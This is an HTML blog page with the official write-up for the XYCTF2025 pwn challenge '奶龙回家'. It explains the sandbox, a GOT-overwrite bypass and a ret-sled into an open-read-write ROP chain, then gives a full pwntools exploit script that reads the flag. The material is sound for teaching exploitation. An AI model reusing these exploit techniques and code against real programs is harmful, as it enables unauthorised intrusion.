@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="XYCTF2025 奶龙回家官方WP说在前面的话这是我第一次为CTF比赛出题，所以可能稍微有点不足 师傅们也都太强辣，这题师傅们做出了2种非预期，我也是学到了很多骚操作，不过貌似还是预期解更简单，所以官方WP就主要写一下预期解的思路，非预期也会提一下的，不是因为我懒(x) 解题思路首先checksec发现仅关闭PIE保护，程序是64位(其实这是废话（x）)  seccomp-tools查看一下沙箱">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XYCTF2025-奶龙回家官方WP">
+<meta property="og:url" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/index.html">
+<meta property="og:site_name" content="PuH4ck3rX&#39;s Blog">
+<meta property="og:description" content="XYCTF2025 奶龙回家官方WP说在前面的话这是我第一次为CTF比赛出题，所以可能稍微有点不足 师傅们也都太强辣，这题师傅们做出了2种非预期，我也是学到了很多骚操作，不过貌似还是预期解更简单，所以官方WP就主要写一下预期解的思路，非预期也会提一下的，不是因为我懒(x) 解题思路首先checksec发现仅关闭PIE保护，程序是64位(其实这是废话（x）)  seccomp-tools查看一下沙箱">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221503456.png">
+<meta property="og:image" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221513550.png">
+<meta property="og:image" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221522665.png">
+<meta property="og:image" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221529685.png">
+<meta property="og:image" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221534791.png">
+<meta property="og:image" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221543330.png">
+<meta property="article:published_time" content="2025-05-07T14:13:10.000Z">
+<meta property="article:modified_time" content="2025-05-07T14:22:11.189Z">
+<meta property="article:author" content="PuH4ck3rX">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221503456.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XYCTF2025-奶龙回家官方WP</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0m3</a></li><!--
+     --><!--
+       --><li><a href="/about/">ab0ut</a></li><!--
+     --><!--
+       --><li><a href="/archives/">art1cl3s</a></li><!--
+     --><!--
+       --><li><a href="/links/">l1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s3arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/07/O-Pwn/index/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&text=XYCTF2025-奶龙回家官方WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&is_video=false&description=XYCTF2025-奶龙回家官方WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XYCTF2025-奶龙回家官方WP&body=Check out this article: http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&name=XYCTF2025-奶龙回家官方WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&t=XYCTF2025-奶龙回家官方WP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP"><span class="toc-number">1.</span> <span class="toc-text">XYCTF2025 奶龙回家官方WP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D"><span class="toc-number">1.0.1.</span> <span class="toc-text">说在前面的话</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        XYCTF2025-奶龙回家官方WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">PuH4ck3rX</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-07T14:13:10.000Z" class="dt-published" itemprop="datePublished">2025-05-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="XYCTF2025-奶龙回家官方WP"><a href="#XYCTF2025-奶龙回家官方WP" class="headerlink" title="XYCTF2025 奶龙回家官方WP"></a>XYCTF2025 奶龙回家官方WP</h2><h4 id="说在前面的话"><a href="#说在前面的话" class="headerlink" title="说在前面的话"></a>说在前面的话</h4><p>这是我第一次为CTF比赛出题，所以可能稍微有点不足</p>
+<p>师傅们也都太强辣，这题师傅们做出了2种非预期，我也是学到了很多骚操作，不过貌似还是预期解更简单，所以官方WP就主要写一下预期解的思路，非预期也会提一下的，不是因为我懒(x)</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>首先checksec发现仅关闭PIE保护，程序是64位(其实这是废话（x）)</p>
+<p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221503456.png" alt="image-20250507221503456"></p>
+<p>seccomp-tools查看一下沙箱保护发现允许<strong>read</strong> <strong>write</strong> <strong>open</strong> <strong>nanosleep</strong> <strong>openat</strong> 系统调用(注意openat是goto 0011 所以也是允许的)</p>
+<p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221513550.png" alt="image-20250507221513550"></p>
+<p>接下来直接拖进IDA中看一下，发现是C++写的，并且去除了符号表，这里我们自己把函数名和变量名重命名一下</p>
+<p>如果觉得有点乱可以先运行一下程序，发现输出了rbp+offset的值</p>
+<p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221522665.png" alt="image-20250507221522665"></p>
+<p>然后仔细分析ida程序，发现会让你输入一个数来控制程序循环次数，第一次限制了输入大小不能超过2，但是后面有将它强制转换成unsigned int 类型，所以只需要输入-1就可以给我们充分循环的次数，程序限制了任意地址读只能执行一次，且无法通过覆盖got表之类的方法绕过退出函数，因为death函数里面有一段直接jmp到不存在地址的汇编，直接导致程序崩溃。任意地址写我们可以执行多次(和循环次数有关)，总循环大于5时会调用sleep函数，sleep函数的系统调用并不是nanosleep,所以程序会崩溃绕过方式也很简单，以为可以任意地址写，所以我们将sleep的got表改成程序中无用的函数地址，也可以直接写入ret的地址，因为调用函数前会push下一条指令的地址到栈中把sleep got表改成ret的地址刚好将原本程序下一条指令给pop到rdi中</p>
+<p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221529685.png" alt="image-20250507221529685"></p>
+<p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221534791.png" alt="image-20250507221534791"></p>
+<p>一下基本的绕过方式就理清楚了，现在我们可以进行任意地址写很多次，以及任意地址读，接下来的解法就很多了，可以通过随机数种子算出rbp把offset求出来，然后写rop链子。也可以把strtoll的got表改成gets的got表直接溢出，打TLS结构体绕过Canary，还可以直接写ret滑梯来执行rop链</p>
+<p>下面用最方便的思路来，其他思路读者可以自行研究</p>
+<p>通过调试或ida中查看可以发现main函数栈帧的空间极大，所以不用担心用泄露出的rbp+offset直接-0x200会覆盖掉程序中的关键部分，导致程序崩溃</p>
+<p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221543330.png" alt="image-20250507221543330"></p>
+<p>所以我们将泄露出的rbp+offset直接-0x200 作为理想rbp地址(注意要补齐8的倍数) 从理想rbp地址开始写0x40个ret，然后就是放我们的常规的orw rop链了，最后将exit的got表覆盖为leave;ret这段gadget的地址，下一次循环输入5，直接进行leave;ret，肯定能命中我们的任意一段ret，然后程序rsp指针一直向高地址滑，直到滑到我们之前写好的orw rop链子；由于题目没给libc，可以先用本地的打通，然后通过任意地址读，leak出的libc地址去libc-database下载对应的libc，试几次就可以了</p>
+<p>还有一种不需要依赖于libc的打法，可以通过ret2dlresolve打，由于是64位的libc，_dl_fixup会从符号版本信息列表l_versions[]中根据偏移获取符号的版本信息，而该偏移则是我们伪造的r_info的index 64位可能不会到可映射区域，所以要将 l_info[VERSYMIDX(DT_VERSYM)]设置为null，从而绕过version &#x3D; &amp;l-&gt;l_versions[ndx];语句分支</p>
+<p>而这个的地址得先知道link_map的地址才能定位，所以用唯一一次任意地址读的机会泄露出link_map的地址，然后就是rop链子就是常规的Partial RELRO下的ret2dlresolve了，不过还是通过libc-database搜索尝试libc的方式简单一些，基于ret2dlresolve的解题思路读者可以下去自行研究</p>
+<p>下面放出官方exp(依赖libc的ret滑梯)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./nailong&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc6_2.35-0ubuntu3.8_amd64.so&#x27;)</span><br><span class="line">#sh = process(&#x27;./nailong&#x27;)</span><br><span class="line">sh = remote(&#x27;ip&#x27;,port)</span><br><span class="line">#gdb.attach(sh,&#x27;b* 0x401AF0\nc&#x27;)</span><br><span class="line">bypass_addr = 4210784</span><br><span class="line">bss_addr = 4211104</span><br><span class="line">read_addr = 4210888</span><br><span class="line">ret_addr_1 = 0x0040101a</span><br><span class="line">ret_addr_2 = 0x00000000</span><br><span class="line">bss_addr_1 = 0x004041A0</span><br><span class="line">bss_addr_2 = 0x00000000</span><br><span class="line">flag_addr_1 = 0x004041C0</span><br><span class="line">flag_addr_2 = 0x00000000</span><br><span class="line">exit_addr = 4210872</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#x27;offset:&#x27;)</span><br><span class="line">rbp_offset_addr = int(sh.recvuntil(&#x27;end&#x27;)[:-3].decode())</span><br><span class="line">if rbp_offset_addr % 8 != 0:</span><br><span class="line">    rbp_offset_addr += 8 - (rbp_offset_addr % 8)</span><br><span class="line">success(hex(rbp_offset_addr))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;xiao_peng_you_ni_zhi_dao_wo_yao_qu_ji_lou_ma\n&#x27;,str(-1))</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(bypass_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;,p32(0x4017A8))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(bss_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;,b&#x27;/fla&#x27;)</span><br><span class="line">bss_addr += 0x4</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(bss_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;,b&#x27;g\x00\x00\x00&#x27;)</span><br><span class="line">rbp = rbp_offset_addr - 0x200</span><br><span class="line">rbp +=0x8</span><br><span class="line"></span><br><span class="line">#success(hex(rbp))</span><br><span class="line">for i in range(1,65):</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(ret_addr_1))</span><br><span class="line">    rbp += 0x4</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(ret_addr_2))</span><br><span class="line">    rbp +=0x4</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(1))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(read_addr))</span><br><span class="line">read_got = u64(sh.recv(6).ljust(8,&#x27;\x00&#x27;.encode()))</span><br><span class="line">success(hex(read_got))</span><br><span class="line">#success(hex(rbp))</span><br><span class="line">offset = read_got - libc.symbols[&#x27;read&#x27;]</span><br><span class="line">libc.address = offset</span><br><span class="line">pop_rdi = 0x000000000002a3e5 + offset</span><br><span class="line">pop_rdi_1 = pop_rdi &amp; 0xFFFFFFFF</span><br><span class="line">pop_rdi_2 = (pop_rdi &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">leave_ret = 0x000000000004da83 + offset</span><br><span class="line">leave_ret_1 = leave_ret &amp; 0xFFFFFFFF</span><br><span class="line">leave_ret_2 = leave_ret &gt;&gt; 32</span><br><span class="line">pop_rsi = 0x000000000002be51 +offset</span><br><span class="line">pop_rsi_1 = pop_rsi &amp; 0xFFFFFFFF</span><br><span class="line">pop_rsi_2 = (pop_rsi &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">pop_rdx = 0x0000000000401650</span><br><span class="line">pop_rdx_1 = pop_rdx &amp; 0xFFFFFFFF</span><br><span class="line">pop_rdx_2 = (pop_rdx &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">open_addr = libc.symbols[&#x27;open&#x27;]</span><br><span class="line">open_addr_1 = open_addr &amp; 0xFFFFFFFF</span><br><span class="line">open_addr_2 = (open_addr &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">read_addr = libc.symbols[&#x27;read&#x27;]</span><br><span class="line">read_addr_1 = read_addr &amp; 0xFFFFFFFF</span><br><span class="line">read_addr_2 = (read_addr &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">write_addr = libc.symbols[&#x27;write&#x27;]</span><br><span class="line">write_addr_1 = write_addr &amp; 0xFFFFFFFF</span><br><span class="line">write_addr_2 = (write_addr &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;, str(exit_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;, p32(leave_ret_1))</span><br><span class="line">exit_addr +=0x4</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;, str(exit_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;, p32(leave_ret_2))</span><br><span class="line">def rop_chain(v1, v2, rbp):</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(v1))</span><br><span class="line">    rbp += 0x4</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(v2))</span><br><span class="line">    rbp += 0x4</span><br><span class="line">    return rbp</span><br><span class="line">rbp = rop_chain(pop_rdi_1, pop_rdi_2, rbp)</span><br><span class="line">rbp = rop_chain(bss_addr_1, bss_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rsi_1, pop_rsi_2, rbp)</span><br><span class="line">rbp = rop_chain(0, 0, rbp)</span><br><span class="line">rbp = rop_chain(open_addr_1, open_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdi_1, pop_rdi_2, rbp)</span><br><span class="line">rbp = rop_chain(3, 0, rbp)</span><br><span class="line">rbp = rop_chain(pop_rsi_1, pop_rsi_2, rbp)</span><br><span class="line">rbp = rop_chain(flag_addr_1, flag_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdx_1, pop_rdx_2, rbp)</span><br><span class="line">rbp = rop_chain(0x50, 0, rbp)</span><br><span class="line">rbp = rop_chain(read_addr_1, read_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdi_1, pop_rdi_2, rbp)</span><br><span class="line">rbp = rop_chain(1, 0, rbp)</span><br><span class="line">rbp = rop_chain(pop_rsi_1, pop_rsi_2, rbp)</span><br><span class="line">rbp = rop_chain(flag_addr_1, flag_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdx_1, pop_rdx_2, rbp)</span><br><span class="line">rbp = rop_chain(0x50, 0, rbp)</span><br><span class="line">rbp = rop_chain(write_addr_1, write_addr_2, rbp)</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(5))</span><br><span class="line">sh.interactive()</span><br><span class="line">#0x7fffc9f571dfs</span><br><span class="line">#140736581693919</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0m3</a></li>
+        
+          <li><a href="/about/">ab0ut</a></li>
+        
+          <li><a href="/archives/">art1cl3s</a></li>
+        
+          <li><a href="/links/">l1nks</a></li>
+        
+          <li><a href="/search/">s3arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP"><span class="toc-number">1.</span> <span class="toc-text">XYCTF2025 奶龙回家官方WP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D"><span class="toc-number">1.0.1.</span> <span class="toc-text">说在前面的话</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&text=XYCTF2025-奶龙回家官方WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/&title=XYCTF2025-奶龙回家官方WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
